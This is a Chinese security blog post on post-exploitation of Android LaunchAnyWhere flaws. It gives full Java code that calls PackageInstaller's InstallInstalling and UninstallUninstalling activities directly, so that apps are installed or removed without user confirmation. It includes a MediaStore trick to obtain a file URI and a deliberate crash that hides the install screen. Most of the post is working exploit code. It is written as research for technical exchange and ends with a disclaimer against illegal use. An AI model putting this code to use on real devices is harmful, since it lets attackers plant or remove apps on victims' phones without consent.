> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [wrlus.com](https://wrlus.com/android-security/package-installer-install-installing/)

> 对于 LaunchAnyWhere 漏洞的利用，传统的思路是 system uid FileProvider 转换为 system_app 权限的任意文件读写，但是很遗憾的是 Android 在这里有缓解措施，不允许 system 和 root uid 随意给其它 uid 授予 URI 权限，曾经也出现过厂商在这块开后面，又被安全研究员绕过的故事，例如我给三星提的 CVE-2023-21474 可以实现在 AOSP Nday CVE-2022-20223 修复后，仍然可以进行利用。

前言
--

对于 LaunchAnyWhere 漏洞的利用，传统的思路是 system uid FileProvider 转换为 system_app 权限的任意文件读写，但是很遗憾的是 Android 在这里有缓解措施，不允许 system 和 root uid 随意给其它 uid 授予 URI 权限，曾经也出现过厂商在这块开后面，又被安全研究员绕过的故事，例如我给三星提的 CVE-2023-21474 可以实现在 AOSP Nday CVE-2022-20223 修复后，仍然可以进行利用。但是这类漏洞逐渐都已经修复，所以对于 LaunchAnyWhere 漏洞，需要思考一些其它利用方式。

> 本文不会讨论任何前置的 LaunchAnyWhere 漏洞，只讨论在实现 LaunchAnyWhere 之后，如何利用 InstallInstalling 实现自动安装。

InstallInstalling
-----------------

Android 除了利用静默安装权限去装应用之外，其它应用只能通过 PackageInstaller 安装应用，其原理是先调用`com.android.packageinstaller.InstallStart`，这里面会调用另外两个 Activity 从调用方的 FileProvider 拷贝 apk 文件到系统，然后再跳转到`com.android.packageinstaller.PackageInstallerActivity`去让用户确认，用户确认之后调用`com.android.packageinstaller.InstallInstalling`进行安装，最后调用`com.android.packageinstaller.InstallSuccess`显示安装成功画面，或者是`com.android.packageinstaller.InstallFailed`安装失败。`InstallInstalling`的 Manifest 定义如下：

```
<activity android: />

```

那么我们既然可以实现 LaunchAnyWhere，能否直接调用`com.android.packageinstaller.InstallInstalling`来绕过未知来源权限和用户的交互，直接实现自动安装呢？答案是肯定的，经过代码的阅读发现，`InstallInstalling`的前一个页面是`PackageInstallerActivity`，我们只需要按照`InstallStaging`构造参数的方式，直接调用`InstallInstalling`，就可以实现，正常情况下在`PackageInstallerActivity`中，用户点击安装按钮之后，调用`InstallInstalling`的代码如下：

```
private void startInstall() {
    String installerPackageName = getIntent().getStringExtra(
            Intent.EXTRA_INSTALLER_PACKAGE_NAME);
    int stagedSessionId = getIntent().getIntExtra(EXTRA_STAGED_SESSION_ID, 0);

    // Start subactivity to actually install the application
    Intent newIntent = new Intent();
    newIntent.putExtra(PackageUtil.INTENT_ATTR_APPLICATION_INFO,
            mPkgInfo.applicationInfo);
    newIntent.setData(mPackageURI);
    newIntent.setClass(this, InstallInstalling.class);
    if (mOriginatingURI != null) {
        newIntent.putExtra(Intent.EXTRA_ORIGINATING_URI, mOriginatingURI);
    }
    if (mReferrerURI != null) {
        newIntent.putExtra(Intent.EXTRA_REFERRER, mReferrerURI);
    }
    if (mOriginatingUid != Process.INVALID_UID) {
        newIntent.putExtra(Intent.EXTRA_ORIGINATING_UID, mOriginatingUid);
    }
    if (installerPackageName != null) {
        newIntent.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME,
                installerPackageName);
    }
    if (getIntent().getBooleanExtra(Intent.EXTRA_RETURN_RESULT, false)) {
        newIntent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
    }
    if (stagedSessionId > 0) {
        newIntent.putExtra(EXTRA_STAGED_SESSION_ID, stagedSessionId);
    }
    if (mAppSnippet != null) {
        newIntent.putExtra(EXTRA_APP_SNIPPET, mAppSnippet);
    }
    newIntent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
    if (mLocalLOGV) Log.i(TAG, "downloaded app uri=" + mPackageURI);
    startActivity(newIntent);
    finish();
}

```

这里面关键的参数就只有`EXTRA_STAGED_SESSION_ID`，`INTENT_ATTR_APPLICATION_INFO`和`mPackageURI`，前者需要我们自己打开一个 PackageInstaller 的 session，并获得 sessionId 传入，第二个需要我们自己调用`getPackageArchiveInfo`解析一下安装包信息，获取 ApplicationInfo 对象并传入，而`mPackageURI`根据代码，则需要一个 file scheme，这在 Android 11 以上版本就有些困难，因为我们的应用已经无法访问 sdcard 公共存储，又不能将自己私有目录的文件直接通过 file scheme 共享出去。这里原本的逻辑实际上是 PackageInstaller 先在`InstallStaging`中读取了调用方 FileProvider 的文件并复制到它的目录，然后再获取一个 file scheme 到这里，这里我们必须想办法构造一个 file scheme 给 PackageInstaller。

MediaStore 写入下载目录
-----------------

因为要构造 file scheme，我们可以选择不适配沙盒存储，然后直接申请传统的存储权限（`READ_EXTERNAL_STORAGE`），但是我认为向用户申请权限就不够完美。这里我想到一个点 Android 10 以上可以使用 MediaStore 向下载目录写入文件，而无需任何权限：

```
public static void copyFileToDownload(Context context, File source,
                                      String name, String mineType) throws IOException {
    ContentValues values = new ContentValues();
    values.put(MediaStore.MediaColumns.DISPLAY_NAME, name);
    values.put(MediaStore.MediaColumns.MIME_TYPE, mineType);
    values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

    Uri uri = context.getContentResolver()
            .insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
    if (uri != null) {
        FileInputStream fis = new FileInputStream(source);
        OutputStream os = context.getContentResolver().openOutputStream(uri);
        if (os == null) {
            Log.e(TAG, "openOutputStream failed.");
            return;
        }
        FileUtils.copy(fis, os);
        os.close();
        fis.close();
    } else {
        Log.e(TAG, "Failed to create file");
    }
}

```

然后再手动构造一个 file scheme 传给 PackageInstaller：

```
File apkFileInDownload = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), apkFile.getName());
//...
installingIntent.setData(Uri.fromFile(apkFileInDownload));

```

正常来说，在 Android 7.0 以上版本，如果 data 字段使用 file scheme 的话，当调用 startActivity 的时候会抛出 FileUriExposedException，但是这里因为最后是 system uid 去启动页面，所以不会受到 FileUriExposedException 的影响。

自动安装实现
------

至此已经可以调用`InstallInstalling`完成任务，不过我发现如果不传入`INTENT_ATTR_APPLICATION_INFO`的话，`InstallInstalling`在提交 PackageInstaller 的 session 之后就会因为解析不到应用信息而崩溃，这样便实现了隐蔽安装（UI 一闪而过，不是完全静默），如果正常传这个参数，就会正常显示安装页面直到安装完成：

```
if (ignoreInstalling) {
    installingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
            Intent.FLAG_ACTIVITY_NO_ANIMATION);
} else {
    // 如果不传这个参数，InstallInstalling在提交安装Session之后就会崩溃，实现不显示安装进度效果。
    PackageInfo packageInfo = context.getPackageManager()
            .getPackageArchiveInfo(apkFile.getAbsolutePath(), PackageManager.GET_PERMISSIONS);
    if (packageInfo == null) {
        Log.e(TAG, "getPackageArchiveInfo returns null, fail to silent install.");
        return;
    }
    installingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    installingIntent.putExtra("com.android.packageinstaller.applicationInfo",
            packageInfo.applicationInfo);
}

```

自动卸载实现
------

除了`InstallInstalling`以外，还可以通过`UninstallUninstalling`实现自动卸载，原理比较类似，这里需要构造一个 ApplicationInfo 传过去：

```
Intent uninstallingIntent = new Intent();

uninstallingIntent.setClassName(Constants.PACKAGE_INSTALLER_PKG,
        Constants.PACKAGE_INSTALLER_PKG + ".UninstallUninstalling");
ApplicationInfo applicationInfo = null;
try {
    applicationInfo = context.getPackageManager()
            .getApplicationInfo(packageName, 0);
} catch (PackageManager.NameNotFoundException e) {
    Log.e(TAG, "NameNotFoundException, failed to uninstall.", e);
    return;
}

uninstallingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
uninstallingIntent.putExtra("com.android.packageinstaller.applicationInfo",
        applicationInfo);
uninstallingIntent.putExtra("android.content.pm.extra.CALLBACK", (Parcelable) null);
uninstallingIntent.putExtra("com.android.packageinstaller.extra.APP_LABEL",
        applicationInfo.name);
uninstallingIntent.putExtra("android.intent.extra.UNINSTALL_ALL_USERS", true);
uninstallingIntent.putExtra("com.android.packageinstaller.extra.KEEP_DATA", false);
uninstallingIntent.putExtra("android.intent.extra.USER", Process.myUserHandle());
uninstallingIntent.putExtra("android.content.pm.extra.DELETE_FLAGS", 0);

```

然后就可以静默卸载掉这个应用。

完整代码
----

```
public static void autoInstall(Context context, File apkFile, boolean ignoreInstalling) throws IOException {
    if (!apkFile.exists() || !apkFile.getName().endsWith(".apk")) {
        Log.e(TAG, "Must use an apk file to silent install.");
        return;
    }
    // 打开PackageInstaller的session
    PackageInstaller pi = context.getPackageManager().getPackageInstaller();
    PackageInstaller.SessionParams params =
            new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
    int sessionId = pi.createSession(params);
    PackageInstaller.Session session = pi.openSession(sessionId);
    // 写入apk到session
    OutputStream os = session.openWrite("package", 0, -1);
    FileInputStream fis = new FileInputStream(apkFile);
    byte[] buffer = new byte[4096];
    for (int n; (n = fis.read(buffer)) > 0;) {
        os.write(buffer, 0, n);
    }
    fis.close();
    os.flush();
    os.close();
    // 将文件复制到download目录
    // 如果文件存在会重复
    Android.copyFileToDownload(context, apkFile, apkFile.getName(),
            "application/vnd.android.package-archive");
    // 传给InstallInstalling的时候，需要是file uri
    // 因为后面是由system_server执行startActivityAsUser，所以不会受到FileUriExposedException的影响
    File apkFileInDownload = new File(Environment
            .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), apkFile.getName());
    // 构造调用InstallInstalling的Intent
    Intent installingIntent = new Intent();
    installingIntent.setClassName(Constants.PACKAGE_INSTALLER_PKG,
            Constants.PACKAGE_INSTALLER_PKG + ".NewInstallInstalling");
    installingIntent.putExtra("EXTRA_STAGED_SESSION_ID", sessionId);
    installingIntent.setData(Uri.fromFile(apkFileInDownload));
    if (ignoreInstalling) {
        installingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
                Intent.FLAG_ACTIVITY_NO_ANIMATION);
    } else {
        // 如果不传这个参数，InstallInstalling在提交安装Session之后就会崩溃，实现不显示安装进度效果。
        PackageInfo packageInfo = context.getPackageManager()
                .getPackageArchiveInfo(apkFile.getAbsolutePath(), PackageManager.GET_PERMISSIONS);
        if (packageInfo == null) {
            Log.e(TAG, "getPackageArchiveInfo returns null, failed to auto install.");
            return;
        }
        installingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        installingIntent.putExtra("com.android.packageinstaller.applicationInfo",
                packageInfo.applicationInfo);
    }
    // exploit system!
    launchAnyWhereExploit(Constants.PACKAGE_INSTALLER_PKG,
            installingIntent, false);
}

public static void autoInstall(Context context, String asset, boolean ignoreInstalling) throws IOException {
    File apkFile = new File(context.getCacheDir(), asset);
    Android.copyAsset(context, asset, apkFile);
    autoInstall(context, apkFile, ignoreInstalling);
}

public static void autoInstallAsync(Context context) {
    Thread installThread = new Thread(() -> {
        try {
            autoInstall(context, "test.apk", false);
        } catch (IOException e) {
            Log.e(TAG, "autoInstallAsync IOException", e);
        }
    });
    installThread.setName("AutoInstallThread");
    installThread.setDaemon(true);
    installThread.start();
}

public static void autoUninstall(Context context, String packageName) {
    if (configFreeformEnabled(Constants.PACKAGE_INSTALLER_PKG) != 1) {
        Log.e(TAG, "configFreeformEnabled failed, check previous log for reason.");
        return;
    }

    // 构造调用UninstallUninstalling的Intent
    Intent uninstallingIntent = new Intent();
    uninstallingIntent.setClassName(Constants.PACKAGE_INSTALLER_PKG,
            Constants.PACKAGE_INSTALLER_PKG + ".UninstallUninstalling");
    ApplicationInfo applicationInfo = null;
    try {
        applicationInfo = context.getPackageManager()
                .getApplicationInfo(packageName, 0);
    } catch (PackageManager.NameNotFoundException e) {
        Log.e(TAG, "NameNotFoundException, failed to uninstall.", e);
        return;
    }

    uninstallingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    uninstallingIntent.putExtra("com.android.packageinstaller.applicationInfo",
            applicationInfo);
    uninstallingIntent.putExtra("android.content.pm.extra.CALLBACK", (Parcelable) null);
    uninstallingIntent.putExtra("com.android.packageinstaller.extra.APP_LABEL",
            applicationInfo.name);
    uninstallingIntent.putExtra("android.intent.extra.UNINSTALL_ALL_USERS", false);
    uninstallingIntent.putExtra("com.android.packageinstaller.extra.KEEP_DATA", false);
    uninstallingIntent.putExtra("android.intent.extra.USER", Process.myUserHandle());
    uninstallingIntent.putExtra("android.content.pm.extra.DELETE_FLAGS", 0);

    // exploit system!
    launchAnyWhereExploit(Constants.PACKAGE_INSTALLER_PKG,
            uninstallingIntent, false);
}

```

总结
--

本文介绍了`InstallInstalling`和`UninstallUninstalling`调用方式，可以用于 LaunchAnyWhere 漏洞的后利用，实现绕过厂商冗长的锁屏密码甚至实名检查，直接安装一个应用。因为这些操作都是会出现界面，用户可感知到，所以也不可能用于完全静默安装，本文仅为技术交流，请勿用于非法用途。